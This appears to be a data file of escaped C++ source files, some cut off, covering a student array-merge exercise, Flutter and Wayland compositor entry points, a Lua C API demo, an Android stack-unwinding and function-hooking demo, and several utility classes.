format....\";\n\t\tcontinue;\n\t}\n\n\tcout<<\"\\nEnter array:\";\n\tint arr2[y];\n\tfor(int i=0;i<y;i++)\n\tcin>>arr2[i];\n\tfor(int j=0;j<y;j++)\n\t{\n\t\tif(arr2[j]>arr2[j+1] && j+1<y)\n\t\t{\n\t\t\tflag=false;\n\t\t\tbreak;\n\t\t}\n\t}\n\tif(flag==false)\n\t{\n\t\tcout<<\"\\nRead input in correct format....\";\n\t\tcontinue;\n\t}\n\n\tcout<<\"\\nEnter array:\";\n\tint arr3[z];\n\tfor(int i=0;i<z;i++)\n\tcin>>arr3[i];\n\tfor(int j=0;j<z;j++)\n\t{\n\t\tif(arr3[j]>arr3[j+1] && j+1<z)\n\t\t{\n\t\t\tflag=false;\n\t\t\tbreak;\n\t\t}\n\t}\n\tif(flag==false)\n\t{\n\t\tcout<<\"\\nRead input in correct format....\";\n\t\tcontinue;\n\t}\n\n\tcout<<\"\\nEnter array:\";\n\tint arr4[a];\n\tfor(int i=0;i<a;i++)\n\tcin>>arr4[i];\n\tfor(int j=0;j<a;j++)\n\t{\n\t\tif(arr4[j]>arr4[j+1] && j+1<a)\n\t\t{\n\t\t\tflag=false;\n\t\t\tbreak;\n\t\t}\n\t}\n\tif(flag==false)\n\t{\n\t\tcout<<\"\\nRead input in correct format....\";\n\t\tcontinue;\n\t}\n\n\tcout<<\"\\nEnter array:\";\n\tint arr5[b];\n\tfor(int i=0;i<b;i++)\n\tcin>>arr5[i];\n\tfor(int j=0;j<b;j++)\n\t{\n\t\tif(arr5[j]>arr5[j+1] && j+1<b)\n\t\t{\n\t\t\tflag=false;\n\t\t\tbreak;\n\t\t}\n\t}\n\tif(flag==false)\n\t{\n\t\tcout<<\"\\nRead input in correct format....\";\n\t\tcontinue;\n\t}\t\n\n\t\n\t\n\t}\n\t\n\tint c=x+y+z+a+b;\n\tint arrf[c];\n\tfor(int i=0;i<x;i++)\n\t\tarrf[i]=arr1[i];\n\ttemp=x;\n\t//cout<<\"\\n\"<<temp;\n\tfor(int i=0;i<y;i++)\n\t{\n\t\tarrf[temp]=arr2[i];\n\t\ttemp++;\n\t}\n\t//cout<<\"\\n\"<<temp;\n\tfor(int i=0;i<z;i++)\n\t{\n\t\tarrf[temp]=arr3[i];\n\t\ttemp++;\n\t}\n\t//cout<<\"\\n\"<<temp;\n\tfor(int i=0;i<a;i++)\n\t{\n\t\tarrf[temp]=arr4[i];\n\t\ttemp++;\n\t}\t\n\t//cout<<\"\\n\"<<temp;\n\tfor(int i=0;i<b;i++)\n\t{\n\t\tarrf[temp]=arr5[i];\n\t\ttemp++;\n\t}\n\t//cout<<\"\\n\"<<temp;\n\t\n\t\n\ttemp=0;\n\tfor(int i=0;i<c;i++)\n\t{\n\t\tfor(int j=0;j<c;j++)\n\t\t{\n\t\t\tif(arrf[j]<arrf[j+1] && j+1<c)\n\t\t\t{\n\t\t\t\ttemp=arrf[j];\n\t\t\t\tarrf[j]=arrf[j+1];\n\t\t\t\tarrf[j+1]=temp;\n\t\t\t}\n\t\t}\n\t}\n\ttemp=0;\n\tfor(int i=0;i<c;i++)\n\t{\n\t\tfor(int j=i+1;j<c;j++)\n\t\t{\n\t\t\tif(arrf[i]==arrf[j])\n\t\t\t{\n\t\t\t\tfor(temp=j;temp<c;temp++)\n\t\t\t\tarrf[temp]=arrf[temp+1];\n\t\t\t}\n\t\t\ttemp=0;\n\t\t}\t\n\t\n\t}\n\t\n\t\n\tcout<<\"\\nFinal Array=\";\n\tfor(int i=0;i<c;i++)\n\t{\n\tif(arrf[i]==arrf[i+1] && i+1<c)\n\tcontinue;\n\tcout<<arrf[i]<<',';\n\t}\n\n\treturn 0;\n\n\n\t\n}\n\n\n\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"location_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <jni.h>\n#include <string>\n#include <android/log.h>\n#include <unwindstack/Unwinder.h>\n#include <unwindstack/RegsArm64.h>\n#include <unwindstack/UserArm64.h>\n#include \"dobby.h\"\n\nvoid printNativeStack(sigcontext *sigcontext) {\n    std::string str;\n    auto process_memory = unwindstack::Memory::CreateProcessMemory(getpid());\n    std::unique_ptr<unwindstack::Maps> maps(new unwindstack::LocalMaps());\n    auto regs =\n            unwindstack::RegsArm64::Read((unwindstack::arm64_user_regs *) sigcontext->regs);\n    std::unique_ptr<unwindstack::Regs> unwind_regs(regs);\n\n    if (!maps->Parse()) {\n        __android_log_print(ANDROID_LOG_ERROR, \"Cvm\", \"Failed to parse maps\");\n        return;\n    }\n\n\n    unwindstack::Unwinder unwinder(512, maps.get(), unwind_regs.get(), process_memory);\n    unwinder.Unwind();\n\n    __android_log_print(ANDROID_LOG_INFO, \"Cvm\", \"NumFrames %d \", unwinder.NumFrames());\n\n    for (size_t i = 0; i < unwinder.NumFrames(); i++) {\n        str += unwinder.FormatFrame(i) + \"\\n\";\n    }\n\n    __android_log_print(ANDROID_LOG_INFO, \"Cvm\", \"FormatFrame \\n%s \", str.c_str());\n}\n\nvoid signalHandler(int signum, siginfo_t *info, void *context) {\n    ucontext_t *uc = (ucontext_t *) context;\n    sigcontext *sc = &uc->uc_mcontext;\n\n    __android_log_print(ANDROID_LOG_INFO, \"Cvm\", \"Signal %d received\", signum);\n\n    printNativeStack(sc);\n}\n\nvoid setupSignalHandler() {\n    struct sigaction sa;\n    sa.sa_flags = SA_SIGINFO;\n    sa.sa_sigaction = signalHandler;\n    sigemptyset(&sa.sa_mask);\n\n    if (sigaction(SIGSYS, &sa, NULL) == -1) {\n        __android_log_print(ANDROID_LOG_ERROR, \"Cvm\", \"Failed to set up SIGSYS handler\");\n    }\n\n}\n\nvoid *(*Old_a)(int a);\nvoid Demo(int a) {\n    __android_log_print(ANDROID_LOG_ERROR, \"Cvm\", \"Demo a = %d\", a);\n}\n\nvoid Demoa(int a) {\n    __android_log_print(ANDROID_LOG_ERROR, \"Cvm\", \"Demo a = 999\");\n}\nextern \"C\" JNIEXPORT jstring\n\nJNICALL\nJava_com_Cvm_unwindstack_MainActivity_stringFromJNI(\n        JNIEnv *env,\n        jobject /* this */) {\n    std::string hello = \"Hello from C++\";\n    setupSignalHandler();\n    raise(SIGSYS);\n    Demo(123);\n    return env->NewStringUTF(hello.c_str());\n}\nstatic void Demo_handler(void *address, DobbyRegisterContext *ctx) {\n    raise(SIGSYS);\n//    printNativeStack(reinterpret_cast<sigcontext *>(ctx->dmmpy_1));\n}\n\njint JNICALL JNI_OnLoad(JavaVM *vm, void *reserved) {\n    JNIEnv *env = nullptr;\n//    DobbyHook((void *) Demo, (dobby_dummy_func_t) Demoa, (dobby_dummy_func_t *) &Old_a);\n    DobbyInstrument((void *) Demo,Demo_handler);\n    if (vm->GetEnv((void **) &env, JNI_VERSION_1_6) == JNI_OK) {\n        return JNI_VERSION_1_6;\n    }\n    return 0;\n}\n",
    "#include \"iostream\"\nextern \"C\"\n{\n#include <lua.h>\n#include <lauxlib.h>\n#include <lualib.h>\n}\n\n/*\n    Lua\u7684\u5f02\u5e38\u6355\u83b7\u4e3b\u8981\u57fa\u4e8epcall\u53caxpcall\u51fd\u6570\u3002\n*/\n\nvoid getStackSize(const char* desc, const int count)\n{\n    printf(\"%s stack size = [ %d ]\\n\", desc, count);\n}\n\nvoid test_api_getfield()\n{\n    lua_State* L = luaL_newstate();\n\n    // \u52a0\u8f7d\u5e76\u6267\u884c\u76ee\u6807lua\u6587\u4ef6\n    if (LUA_OK != luaL_dofile(L, \".\\\\script.lua\")) {\n        const char* err = lua_tostring(L, -1);\n        fprintf(stderr, \"err:\\t%s\\n\", err);\n        return;\n    }\n\n    lua_getglobal(L, \"tab\");           // \u67e5\u627e tab \u53d8\u91cf\u538b\u5165\u6808\u5e95\n\n    // lua_gettop \u83b7\u53d6\u6808\u4e2d\u5143\u7d20\u6570\u91cf\n    getStackSize(\"stage 1\", lua_gettop(L));\n\n    // \n    lua_getfield(L, -1, \"a\");           // \u5c06 tab.a \u5165\u6808\n    int nTab_a = lua_tointeger(L, -1); // \u5c06 tab.a \u53d6\u51fa\u8d4b\u503c\u7ed9\u53d8\u91cfnTab_a\n\n    lua_getfield(L, -2, \"b\");           // \u5c06 tab.b \u5165\u6808\n    int nTab_b = lua_tointeger(L, -1); // \u5c06 tab.b \u53d6\u51fa\u8d4b\u503c\u7ed9\u53d8\u91cfnTab_b\n    getStackSize(\"stage 2\", lua_gettop(L));\n\n    lua_pop(L, 3);                  // \u6e05\u9664\u6389\u6808\u4e2d\u591a\u4f59\u76843\u4e2a\u53d8\u91cftab\u3001tab.a\u3001tab.b\n    getStackSize(\"stage 3\", lua_gettop(L));\n\n    int nTab_c = 2 * nTab_a + nTab_b;\n    lua_pushinteger(L, nTab_c);       // \u5c06 c = 2a + b \u8ba1\u7b97\u5b8c\u6210\uff0c\u538b\u5165\u6808\u9876\n    printf(\"nTab_c = %d \\n\", nTab_c);  // \u8f93\u51fa\uff1a 5\n\n    getStackSize(\"stage 4\", lua_gettop(L));\n\n    lua_getglobal(L, \"lua_func\");        // \u67e5\u627elua_func\u51fd\u6570\u5e76\u5c06\u5176\u538b\u5165\u6808\u5e95\n    lua_pushinteger(L, 3);              // \u538b\u5165\u51fd\u6570\u53d8\u91cf x=3  \n    getStackSize(\"stage 5\", lua_gettop(L));\n\n    // lua_pcall \u5728\u4fdd\u62a4\u6a21\u5f0f\u4e0b\u8c03\u7528\u4e00\u4e2a\u51fd\u6570,\u9632\u6b62\u5f02\u5e38\u7a0b\u5e8f\u76f4\u63a5\u9000\u51fa\n    lua_pcall(L, 1, 1, 0);             // \u6267\u884c\u811a\u672c\u51fd\u6570lua_func\n\n    getStackSize(\"stage 6\", lua_gettop(L));\n\n    int result = lua_tointeger(L, -1);   // \u4ece\u6808\u4e2d\u53d6\u56de\u8fd4\u56de\u503c \n    getStackSize(\"stage 7\", lua_gettop(L));\n    printf(\"res = %d \\n\", result);\n\n\n    lua_pop(L, 1);                       // \u5f39\u51fa\u8fd4\u56de\u7ed3\u679c\n    getStackSize(\"stage 8\", lua_gettop(L));\n\n    lua_close(L);                       //\u5173\u95edlua\u73af\u5883  \n}\n\nint main(int argc, char** argv)\n{\n    lua_State* L;\n    /* Create a Lua state */\n    L = luaL_newstate();\n    /* Check the return value */\n    if (L == NULL) {\n        fprintf(stderr, \"Lua: cannot initialize\\n\");\n        return -1;\n    }\n\n    test_api_getfield();\n    getchar();\n    return 0;\n}\n",
    "/* \n * Copyright (C) 2004      Disch\n *\n * This program is free software; you can redistribute it and/or modify\n * it under the terms of the GNU General Public License as published by\n * the Free Software Foundation; either version 2 of the License, or\n * (at your option) any later version.\n *\n * This program is distributed in the hope that it will be useful,\n * but WITHOUT ANY WARRANTY; without even the implied warranty of\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n * GNU General Public License for more details.\n *\n * You should have received a copy of the GNU General Public License\n * along with this program; if not, write to the Free Software\n * Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA \n */\n\n//////////////////////////////////////////////////////////////////////////\n//\n//  TrackInfoDlg.cpp\n//\n\n\n#include \"../NSF.h\"\n\nCTrackInfoDlg::CTrackInfoDlg() : CDDialog()\n{\n}\n\nCTrackInfoDlg::~CTrackInfoDlg()\n{\n}\n\nvoid CTrackInfoDlg::OnInitDialog()\n{\n\tCDDialog::OnInitDialog();\n\n\tm_tracklist.AttachToControl(hWnd,IDC_TRACKLIST);\n\tm_haslabels.AttachToControl(hWnd,IDC_HASLABELS);\n\tm_haslength.AttachToControl(hWnd,IDC_HASLENGTH);\n\tm_hasfade.AttachToControl(hWnd,IDC_HASFADE);\n\tm_label.AttachToControl(hWnd,IDC_LABEL);\n\tm_length.AttachToControl(hWnd,IDC_LENGTH);\n\tm_fade.AttachToControl(hWnd,IDC_FADE);\n\tm_getlength.AttachToControl(hWnd,IDC_GETLENGTH);\n\tm_getfade.AttachToControl(hWnd,IDC_GETFADE);\n\n\n\tm_haslabels.SetCheck(pFile->szTrackLabels != NULL);\n\tm_label.EnableWindow(pFile->szTrackLabels != NULL);\n\n\tm_haslength.SetCheck(pFile->pTrackTime != NULL);\n\tm_length.EnableWindow(pFile->pTrackTime != NULL);\n\tm_getlength.EnableWindow(pFile->pTrackTime != NULL);\n\n\tm_hasfade.SetCheck(pFile->pTrackFade != NULL);\n\tm_fade.EnableWindow(pFile->pTrackFade != NULL);\n\tm_getfade.EnableWindow(pFile->pTrackFade != NULL);\n\n\tint i;\n\n\tif(bShadow)\n\t{\n\t\tm_tracklist.InsertString(0,pNSF->GetTrackLabel(pFile,nShadowTrack,0));\n\t\tm_tracklist.EnableWindow(0);\n\t\tLoadValues();\n\t}\n\telse\n\t{\n\t\tfor(i = 0; i < pFile->nTrackCount; i++)\n\t\t\tm_tracklist.InsertString(i,pNSF->GetTrackLabel(pFile,i,0));\n\t\tm_tracklist.EnableWindow(1);\n\t\tsel = -1;\n\t\tm_tracklist.SetCurSel(0);\n\t\tOnSelchangeList();\n\t}\n\n\n\tAFX_MAPMESSAGE(IDC_TRACKLIST,LBN_SELCHANGE,&CTrackInfoDlg::OnSelchangeList);\n\tAFX_MAPMESSAGE(IDC_TRACKLIST,LBN_DBLCLK,&CTrackInfoDlg::OnDblClickList);\n\tAFX_MAPMESSAGE(IDC_HASLABELS,BN_CLICKED,&CTrackInfoDlg::OnHasLabels);\n\tAFX_MAPMESSAGE(IDC_HASLENGTH,BN_CLICKED,&CTrackInfoDlg::OnHasLength);\n\tAFX_MAPMESSAGE(IDC_HASFADE,BN_CLICKED,&CTrackInfoDlg::OnHasFade);\n\tAFX_MAPMESSAGE(IDC_GETLENGTH,BN_CLICKED,&CTrackInfoDlg::OnGetLength);\n\tAFX_MAPMESSAGE(IDC_GETFADE,BN_CLICKED,&CTrackInfoDlg::OnGetFade);\n}\n\nvoid CTrackInfoDlg::OnDblClickList()\n{\n\tint i = m_tracklist.GetCurSel();\n\tif(i < 0)\n\t\treturn;\n\n\tif(bShadow)\n\t\ti = nShadowTrack;\n\n\tif(pNSF->szLoadedPath == szPath)\n\t\tpNSF->SetTrack((BYTE)i);\n}\n\nvoid CTrackInfoDlg::OnSelchangeList()\n{\n\tif(bShadow)\n\t\treturn;\n\n\tif(sel != -1)\n\t\tStoreValues();\n\tsel = m_tracklist.GetCurSel();\n\tif(sel != -1)\n\t\tLoadValues();\n}\n\nvoid CTrackInfoDlg::LoadValues()\n{\n\tif(bShadow)\n\t\tsel = nShadowTrack;\n\n\tCDString str;\n\n\tif(pFile->szTrackLabels)\n\t\tm_label.SetWindowText(pFile->szTrackLabels[sel]);\n\tif(pFile->pTrackTime)\n\t{\n\t\tif(pFile->pTrackTime[sel] >= 0)\n\t\t{\n\t\t\tstr.Format(\"%u:%02u.%03u\",pFile->pTrackTime[sel] / 60000,(pFile->pTrackTime[sel] / 1000) % 60,pFile->pTrackTime[sel] % 1000);\n\t\t\tm_length.SetWindowText(str);\n\t\t}\n\t\telse\n\t\t\tm_length.SetWindowText(\"\");\n\t}\n\tif(pFile->pTrackFade)\n\t{\n\t\tif(pFile->pTrackFade[sel] >= 0)\n\t\t{\n\t\t\tstr.Format(\"%u:%02u.%03u\",pFile->pTrackFade[sel] / 60000,(pFile->pTrackFade[sel] / 1000) % 60,pFile->pTrackFade[sel] % 1000);\n\t\t\tm_fade.SetWindowText(str);\n\t\t}\n\t\telse\n\t\t\tm_fade.SetWindowText(\"\");\n\t}\n}\n\nvoid CTrackInfoDlg::StoreValues()\n{\n\tif(bShadow)\n\t\tsel = nShadowTrack;\n\n\tCDString str;\n\tUINT mn,sc,ms;\n\tif(pFile->szTrackLabels)\n\t{\n\t\tstr = m_label.GetWindowText();\n\t\tif(lstrlen(pFile->szTrackLabels[sel]) < str.GetLength())\n\t\t{\n\t\t\tdelete[] pFile->szTrackLabels[sel];\n\t\t\tpFile->szTrackLabels[sel] = new char[str.GetLength() + 1];\n\t\t}\n\t\tlstrcpy(pFile->szTrackLabels[sel],str);\n\n\t\tif(bShadow)\n\t\t{\n\t\t\tm_tracklist.ResetContent();\n\t\t\tm_tracklist.InsertString(0,pNSF->GetTrackLabel(pFile,nShadowTrack,0));\n\t\t}\n\t\telse\n\t\t{\n\t\t\tint temp = m_tracklist.GetCurSel();\n\t\t\tm_tracklist.DeleteString(sel);\n\t\t\tm_tracklist.InsertString(sel,pNSF->GetTrackLabel(pFile,sel,0));\n\t\t\tm_tracklist.SetCurSel(temp);\n\t\t}\n\t}\n\n\tif(pFile->pTrackTime)\n\t{\n\t\tstr = m_length.GetWindowText();\n\t\tif(str == \"\")\n\t\t\tpFile->pTrackTime[sel] = -1;\n\t\telse\n\t\t{\n\t\t\tmn = sc = ms = 0;\n\t\t\tsscanf(str,\"%u:%u.%u\",&mn,&sc,&ms);\n\t\t\tpFile->pTrackTime[sel] = (int)((mn * 60000) + (sc * 1000) + ms);\n\t\t}\n\t}\n\tif(pFile->pTrackFade)\n\t{\n\t\tstr = m_fade.GetWindowText();\n\t\tif(str == \"\")\n\t\t\tpFile->pTrackFade[sel] = -1;\n\t\telse\n\t\t{\n\t\t\tmn = sc = ms = 0;\n\t\t\tsscanf(str,\"%u:%u.%u\",&mn,&sc,&ms);\n\t\t\tpFile->pTrackFade[sel] = (int)((mn * 60000) + (sc * 1000) + ms);\n\t\t}\n\t}\n}\n\n\nvoid CTr",
    "#include <iostream>\n#include \"ComputerScientist.h\"\n\n\nostream& operator<< (ostream &out, const ComputerScientist &ComputerScientist)\n{\n\t// Since operator<< is a friend of the ComputerScientist class, we can access\n\t// ComputerScientist's members directly.\n\tout << \"(\" << ComputerScientist.firstName << \" \" << ComputerScientist.lastName;\n\tout << \", id: \" << ComputerScientist.id;\n\tout << \", speciality: \" << ComputerScientist.speciality;\n\tout << \")\";\n\treturn out;\n}\n\n//Initialize class members from constructor arguments \n//by using a member initializer list.\n//This method uses direct initialization, which is more\n//efficient than using assignment operators inside the constructor body.\nComputerScientist::ComputerScientist(const ComputerScientist& rhs)\n\t: firstName{ rhs.firstName }, lastName{ rhs.lastName }, speciality{ rhs.speciality }, id{ rhs.id } {\n\t// empty body of constructor \n}\n\n//Initialize class members from constructor arguments \n//by using a member initializer list.\n//This method uses direct initialization, which is more\n//efficient than using assignment operators inside the constructor body.\nComputerScientist::ComputerScientist(string firstName, string lastName, string speciality, int id)\n\t: firstName{ firstName }, lastName{ lastName }, speciality{ speciality }, id{ id } {\n\t// empty body of constructor \n}\n\n//Initialize class members from constructor arguments \n//by using a member initializer list.\n//This method uses direct initialization, which is more\n//efficient than using assignment operators inside the constructor body.\nComputerScientist::ComputerScientist()\n\t: firstName{ \"\" }, lastName{ \"\" }, speciality{ \"\" }, id{ -1 }  {  \n\t// empty body of constructor \n}\n\nComputerScientist::~ComputerScientist() { }\n\nbool ComputerScientist::operator==( const ComputerScientist& rhs) const {\t\n\treturn this->id == rhs.id;\n}\nbool  ComputerScientist::operator<( const ComputerScientist& rhs) const {\n\treturn this->id < rhs.id;\t\n}\n\nComputerScientist & ComputerScientist::operator=(const ComputerScientist & rhs) {\n\tthis->firstName = rhs.firstName;\n\tthis->lastName = rhs.lastName;\n\tthis->speciality = rhs.speciality;\n\tthis->id = rhs.id;\n\treturn *this;\n}\n\n string ComputerScientist::getFirstName() const {\n\treturn this->firstName;\n}\n\n string ComputerScientist::getLastName() const {\n\treturn this->lastName;\n}\n\n string ComputerScientist::getSpeciality() const {\n\treturn this->speciality;\n}\n\n int ComputerScientist::getID() const {\n\treturn this->id;\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"todos\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <LLauncher.h>\n#include <LLog.h>\n#include <unistd.h>\n\n#include \"Compositor.h\"\n\nint main(int, char *[])\n{\n    /* Enable Louvre fatal logs */\n    setenv(\"LOUVRE_DEBUG\", \"1\", 0);\n\n    /* Enable SRM fatal logs */\n    setenv(\"SRM_DEBUG\", \"1\", 0);\n\n    /* Enable triple buffering when using the DRM backend (provides a smoother experience but consumes more CPU) */\n    setenv(\"SRM_RENDER_MODE_ITSELF_FB_COUNT\", \"3\", 0);\n\n    /* Same but for discrete GPUs */\n    setenv(\"SRM_RENDER_MODE_DUMB_FB_COUNT\", \"3\", 0);\n\n    /* Force OpenGL buffer allocation instead of GBM when using the DRM backend */\n    setenv(\"SRM_FORCE_GL_ALLOCATION\", \"1\", 0);\n\n    /* Enable Wayland for Firefox */\n    setenv(\"MOZ_ENABLE_WAYLAND\", \"1\", 1);\n\n    /* Enable Wayland for Qt apps */\n    setenv(\"QT_QPA_PLATFORM\", \"wayland-egl\", 1);\n\n    /* Enable Wayland for GTK apps */\n    setenv(\"GDK_BACKEND\", \"wayland\", 1);\n\n    /* The Wayland socket that apps started with LLauncher will listen to */\n    setenv(\"LOUVRE_WAYLAND_DISPLAY\", \"wayland-2\", 0);\n\n    /* Starts an auxiliary daemon allowing shell commands to be run via LLauncher::launch().\n     * Note: If you decide not to use this daemon be careful when forking after LCompositor is started, as libseat and other\n     * subsystems might leak resources and interfere with the session if not handled properly. */\n    LLauncher::startDaemon();\n\n    Compositor compositor;\n\n    /* You can load a custom input and graphics backend here. For more details, see the LCompositor documentation.\n     * By default, if the WAYLAND_DISPLAY environment variable is set, the Wayland backends will be loaded,\n     * otherwise, if launched from a free TTY, the DRM and Libinput backends will be used.*/\n\n    if (!compositor.start())\n    {\n        LLog::fatal(\"Failed to start compositor.\");\n        return EXIT_FAILURE;\n    }\n\n    /* Main thread loop, use LCompositor::fd() to get a pollable fd if needed. */\n    while (compositor.state() != LCompositor::Uninitialized)\n        compositor.processLoop(-1);\n\n    return EXIT_SUCCESS;\n}\n",
    "#include \"PyString.h\"\n\nPyString::PyString(){};\n\nPyString::PyString(const char *message)\n{\n  this->message = message;\n}\nPyString::PyString(char character)\n{\n}\nvoid PyString::display()\n{\n  std::cout << message << std::endl;\n}\n\nstd::string PyString::operator()() const\n{\n  return message;\n}\n\nPyString PyString::operator+(const PyString &other) const\n{\n  return PyString((message + other.message).c_str());\n}\nbool PyString::operator>(const PyString &other) const\n{\n  return (message > other.message);\n}\nbool PyString::operator<(const PyString &other) const\n{\n  return (message < other.message);\n}\nbool PyString::operator==(const PyString &other) const\n{\n  return (message == other.message);\n}\nbool PyString::operator>=(const PyString &other) const\n{\n  return (message >= other.message);\n}\nbool PyString::operator<=(const PyString &other) const\n{\n  return (message <= other.message);\n}\nPyString &PyString::operator+=(const PyString &other)\n{\n  message = message + other.message;\n  return *this;\n}\n\n// Overload [] operator for read-only access\nchar PyString::operator[](size_t index) const\n{\n  if (index >= message.length())\n  {\n    throw std::out_of_range(\"Index out of range\");\n  }\n  return message[index];\n}\n\n// Overload [] operator for write access\nchar &PyString::operator[](size_t index)\n{\n  if (index >= message.length())\n  {\n    throw std::out_of_range(\"Index out of range\");\n  }\n  return message[index];\n}\n\n// Overload [] operator to perform slicing\nstd::string PyString::operator[](const std::string &slice)\n{\n  int start = 0, stop = message.length(), step = 1;\n\n  // Parse slice string\n  size_t colonPos = slice.find(':');\n  if (colonPos != std::string::npos)\n  {\n    start = slice.substr(0, colonPos).empty() ? 0 : std::stoi(slice.substr(0, colonPos));\n    stop = slice.substr(colonPos + 1).empty() ? stop : std::stoi(slice.substr(colonPos + 1));\n  }\n\n  std::string result;\n  for (int i = start; i < stop; i += step)\n  {\n    result += message[i];\n  }\n  return result;\n}\n\nconst char *PyString::begin() const\n{\n  return message.data();\n}\n\n// Iterator for range-based for loops (end)\nconst char *PyString::end() const\n{\n  return message.data() + message.size();\n}\n// len\nint PyString::len()\n{\n  return message.length();\n}\n\n// capitalize\nstd::string PyString::capitalize()\n{\n  if (!message.empty() && std::isalpha(static_cast<unsigned char>(message[0])))\n  {\n    message[0] = std::toupper(static_cast<unsigned char>(message[0]));\n  }\n  return message;\n}\n\nstd::string PyString::upper()\n{\n  std::string temp;\n  if (!message.empty())\n  {\n    for (unsigned char c : message)\n    {\n      temp += std::toupper(c);\n    }\n  }\n  return temp;\n}\n\nstd::string PyString::lower()\n{\n  std::string temp;\n  if (!message.empty())\n  {\n    for (unsigned char c : message)\n    {\n      temp += std::tolower(c);\n    }\n  }\n  return temp;\n}\n// count\nint PyString::count(const std::string &substring)\n{\n  if (substring.empty())\n    return 0;\n\n  int count = 0;\n  size_t pos = message.find(substring);\n\n  while (pos != std::string::npos)\n  {\n    count++;\n    pos = message.find(substring, pos + substring.size());\n  }\n\n  return count;\n}\n\nvoid PyString::pop(size_t index)\n{\n  if (index < message.size())\n  {\n    message.erase(index, 1);\n  }\n  else\n  {\n    std::cerr << \"Index out of range.\" << std::endl;\n  }\n}\n\nvoid PyString::pop()\n{\n  if (!message.empty())\n  {\n    message.erase(message.end() - 1);\n  }\n}\n\n// find\nint PyString::find(const std::string &substring)\n{\n  size_t index = message.find(substring);\n  if (index == std::string::npos)\n  {\n    throw std::out_of_range(\"Substring not found\");\n  }\n  return static_cast<int>(index);\n}\n\n// isalpha\nbool PyString::isalpha() const\n{\n  for (char c : message)\n  {\n    if (!std::isalpha(static_cast<unsigned char>(c)))\n    {\n      return false;\n    }\n  }\n  return true;\n}\n// isascii()\nbool PyString::isAscii() const\n{\n  for (char c : message)\n  {\n    if (static_cast<unsigned char>(c) > 127)\n    { // ASCII values range from 0 to 127\n      return false;\n    }\n  }\n  return true;\n}\n\n// isdigit()\nbool PyString::isdigit() const\n{\n  for (char c : message)\n  {\n    if (!std::isdigit(static_cast<unsigned char>(c)))\n    {\n      return false;\n    }\n  }\n  return true;\n}\n\nbool PyString::isdecimal() const\n{\n  for (char c : message)\n  {\n    if (!std::isdigit(static_cast<unsigned char>(c)) || c < '0' || c > '9')\n    {\n      return false;\n    }\n  }\n  return true;\n}\n\n// islower()\nbool PyString::islower() const\n{\n  for (char c : message)\n  {\n    if (!std::islower(static_cast<unsigned char>(c)))\n    {\n      return false;\n    }\n  }\n  return true;\n}\n\n// isupper()\nbool PyString::isupper() const\n{\n  for (char c : message)\n  {\n    if (!std::isupper(static_cast<unsigned char>(c)))\n    {\n      return false;\n    }\n  }\n  return true;\n}\n\n// isnumeric()\nbool PyString::isnumeric() const\n{\n  for (char c : message)\n  {\n    if (!(std::isdigit(static_cast<unsigned char>(c)) || std::isalnum(static_cast<unsigned char>(c))))\n    {\n      return false;\n    }\n  }\n  return true;\n}\n\n// isalnum\nbool Py",
    "// Copyright Epic Games, Inc. All Rights Reserved.\n\n#include \"DriverSequence.h\"\n#include \"IStepExecutor.h\"\n#include \"IDriverSequence.h\"\n#include \"IElementLocator.h\"\n#include \"IApplicationElement.h\"\n#include \"IApplicationElement.h\"\n\n#include \"AutomatedApplication.h\"\n#include \"AutomationDriverLogging.h\"\n#include \"AutomationDriver.h\"\n#include \"DriverConfiguration.h\"\n#include \"StepExecutor.h\"\n#include \"WaitUntil.h\"\n#include \"LocateBy.h\"\n\n#include \"GenericPlatform/ICursor.h\"\n#include \"Misc/Timespan.h\"\n#include \"InputCoreTypes.h\"\n#include \"GenericPlatform/GenericApplicationMessageHandler.h\"\n#include \"Framework/Application/SlateApplication.h\"\n\n\nclass FStep\n{\npublic:\n\n\tstatic FStepResult Done()\n\t{\n\t\treturn FStepResult(FStepResult::EState::DONE, FTimespan::FromSeconds(0.01));\n\t}\n\n\tstatic FStepResult Done(double 